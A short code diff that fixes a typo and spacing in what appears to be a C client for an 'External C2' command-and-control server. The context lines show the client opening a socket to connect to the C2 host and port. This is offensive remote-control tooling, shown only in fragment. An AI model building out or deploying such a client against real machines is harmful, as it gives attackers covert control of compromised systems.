@@ -58,7 +58,7 @@ void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
 }
 
 /* the main logic for our client */
-void go(char* host, DWORD port) {
+void go(char * host, DWORD port) {
 	/*
 	* connect to the External C2 server
 	*/
@@ -72,7 +72,7 @@ void go(char* host, DWORD port) {
 	/* attempt to connect */
 	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
 
-	if ( connect(socket_extc2, (structsockaddr *)&sock, 
+	if ( connect(socket_extc2, (struct sockaddr *)&sock, 
 			sizeof(sock)) ) {
 		printf("Could not connect to %s:%d\n", host, port);
 		exit(0);
